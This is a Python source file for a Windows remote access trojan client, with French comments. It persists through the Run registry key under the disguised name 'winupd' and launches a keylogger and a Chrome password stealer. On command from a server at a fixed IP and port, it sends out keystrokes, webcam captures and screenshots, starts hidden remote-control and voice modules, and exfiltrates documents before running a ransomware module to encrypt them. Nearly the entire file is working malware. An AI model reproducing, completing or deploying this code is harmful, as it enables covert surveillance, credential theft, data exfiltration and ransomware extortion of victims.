import subprocess
import socket
import json
import threading
import os
import sys
import time
import ctypes
import winreg

SERVER_IP = "192.168.198.200"
SERVER_PORT = 5001

if getattr(sys, 'frozen', False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

KEYLOGGER_EXE = os.path.join(BASE_DIR, "keylogger.exe")
PASSWORD_EXE = os.path.join(BASE_DIR, "chrome_password.exe")
WEBCAM_EXE = os.path.join(BASE_DIR, "web_cam.exe")
KEYLOG_FILE = os.path.join(BASE_DIR, "keylogs.txt")
REMOTE_EXE = os.path.join(BASE_DIR, "remote.exe")
SCREENSHOT_EXE = os.path.join(BASE_DIR, "screenshot.exe")
CAPTURE_DIR = os.path.join(BASE_DIR, "captures")
SCREENSHOT_DIR = os.path.join(BASE_DIR, "screenshot")
VOICE_EXE = os.path.join(BASE_DIR, "voice_module.exe")
RANSOMWARE_EXE = os.path.join(BASE_DIR, "ransomware_module.exe")


def hide_file(path):
    FILE_ATTRIBUTE_HIDDEN = 0x02
    FILE_ATTRIBUTE_SYSTEM = 0x04
    attrs = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
    ctypes.windll.kernel32.SetFileAttributesW(path, attrs)


def add_to_startup(exe_path, name="winupd"):
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_SET_VALUE
    )
    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, exe_path)
    winreg.CloseKey(key)


def send_file(client_socket, file_path, file_type):
    try:
        if not os.path.exists(file_path):
            print(f"[-] Fichier non trouvé : {file_path}")
            return

        with open(file_path, "rb") as file:
            file_data = file.read()

        payload = json.dumps({
            "type": file_type,
            "filename": os.path.basename(file_path),
            "data": file_data.hex()
        })
        client_socket.send(payload.encode('utf-8'))
        print(f"[+] Fichier '{file_path}' envoyé au serveur.")
    except Exception as e:
        print(f"[Erreur] lors de l'envoi : {e}")


def exfiltrate_file(file_path, sock):
    try:
        filename = os.path.basename(file_path)
        filesize = os.path.getsize(file_path)
        header = f"exfil:{filename}:{filesize}".encode().ljust(128)
        sock.sendall(header)

        with open(file_path, "rb") as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                sock.sendall(chunk)
        print(f"[+] Fichier exfiltré : {file_path}")
    except Exception as e:
        print(f"[!] Erreur exfiltration : {e}")


def wait_for_file(file_path, timeout=10):
    start_time = time.time()
    while not os.path.exists(file_path):
        if time.time() - start_time > timeout:
            print(f"[-] Temps d'attente dépassé pour le fichier : {file_path}")
            return False
        time.sleep(1)
    return True


def handle_commands(client_socket):
    try:
        while True:
            command = client_socket.recv(1024).decode('utf-8')
            print(f"[+] Commande reçue : {command}")

            if command == "keylogger":
                if wait_for_file(KEYLOG_FILE):
                    send_file(client_socket, KEYLOG_FILE, "keystroke")
                    os.remove(KEYLOG_FILE)

            elif command == "capture_image":
                subprocess.run([WEBCAM_EXE, "image"], check=True)
                images = [os.path.join(CAPTURE_DIR, f) for f in os.listdir(CAPTURE_DIR) if f.endswith(".jpg")]
                if images:
                    latest_image = max(images, key=os.path.getctime)
                    if wait_for_file(latest_image):
                        send_file(client_socket, latest_image, "webcam_capture")
                        os.remove(latest_image)

            elif command == "capture_video":
                subprocess.run([WEBCAM_EXE, "video"], check=True)
                videos = [os.path.join(CAPTURE_DIR, f) for f in os.listdir(CAPTURE_DIR) if f.endswith(".avi")]
                if videos:
                    latest_video = max(videos, key=os.path.getctime)
                    if wait_for_file(latest_video):
                        send_file(client_socket, latest_video, "webcam_capture")
                        os.remove(latest_video)

            elif command == "remote":
                print("[*] remote.exe est lancé !")
                subprocess.Popen([REMOTE_EXE], creationflags=subprocess.CREATE_NO_WINDOW)

            elif command == "screenshot":
                subprocess.run([SCREENSHOT_EXE], check=True)
                images = [os.path.join(SCREENSHOT_DIR, f) for f in os.listdir(SCREENSHOT_DIR) if f.startswith("screenshot_")]
                if images:
                    latest = max(images, key=os.path.getctime)
                    if wait_for_file(latest):
                        send_file(client_socket, latest, "screenshot")
                        os.remove(latest)

            elif command == "voice":
                subprocess.Popen([VOICE_EXE], creationflags=subprocess.CREATE_NO_WINDOW)

            elif command.startswith("encrypt:"):
                folder = command.split(":", 1)[1]

                # Étape 1 : Exfiltrer les fichiers ciblés avant chiffrement
                for root, _, files in os.walk(folder):
                    for file in files:
                        if file.lower().endswith((".pdf", ".txt", ".docx", ".xls", ".xlsx")):
                            file_path = os.path.join(root, file)
                            exfiltrate_file(file_path, client_socket)

                # Étape 2 : Lancer le ransomware pour chiffrer
                subprocess.Popen([RANSOMWARE_EXE, "encrypt", folder], creationflags=subprocess.CREATE_NO_WINDOW)

            elif command.startswith("decrypt:"):
                folder = command.split(":", 1)[1]
                subprocess.Popen([RANSOMWARE_EXE, "decrypt", folder], creationflags=subprocess.CREATE_NO_WINDOW)

    except Exception as e:
        print(f"[Erreur] de connexion : {e}")


def main():
    # Cacher les exécutables à la fin si souhaité
    # for exe in [KEYLOGGER_EXE, PASSWORD_EXE, WEBCAM_EXE, REMOTE_EXE, SCREENSHOT_EXE, KEYLOG_FILE, SCREENSHOT_DIR, CAPTURE_DIR, sys.executable]:
    #     if os.path.exists(exe):
    #         hide_file(exe)

    add_to_startup(os.path.join(BASE_DIR, "rat_client.exe"))

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((SERVER_IP, SERVER_PORT))

        subprocess.Popen([KEYLOGGER_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run([PASSWORD_EXE], check=True)

        handle_commands(s)


if __name__ == "__main__":
    main()
